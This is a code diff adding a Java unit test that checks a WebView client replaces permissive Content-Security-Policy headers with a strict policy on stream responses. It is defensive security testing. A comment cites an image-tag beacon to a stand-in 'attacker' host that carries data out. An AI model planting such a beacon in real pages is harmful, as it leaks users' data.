@@ -92,6 +92,26 @@ public class QdnBridgeWebViewClientTest {
     }
 
     @Test
+    public void everyStreamCapabilityResponseGetsTheNonScriptableDocumentPolicy() {
+        Map<String, String> headers = new HashMap<>();
+        headers.put("Content-Security-Policy", "default-src *; script-src *;");
+        headers.put("Content-Security-Policy-Report-Only", "script-src *;");
+        headers.put("Content-Type", "text/html");
+
+        Map<String, String> prepared = QdnBridgeWebViewClient.prepareStreamResponseHeaders(
+            QdnBridgeWebViewClient.withoutContentTypeHeader(headers)
+        );
+
+        assertEquals(QdnBridgeWebViewClient.HOME_QDN_STREAM_POLICY,
+            prepared.get("Content-Security-Policy"));
+        assertEquals("nosniff", prepared.get("X-Content-Type-Options"));
+        assertFalse(prepared.containsKey("Content-Security-Policy-Report-Only"));
+        // Content-Type is passed through WebResourceResponse's mime argument,
+        // so the header map must remain free of a duplicate field.
+        assertFalse(prepared.containsKey("Content-Type"));
+    }
+
+    @Test
     public void aNodeThatOmitsCspDoesNotGetAWEAKERSandboxThanOneThatSetsIt() {
         // The point of the minimum policy. A connection-only policy would leave
         // <img src="https://attacker/?d=…"> available — a beacon that needs no
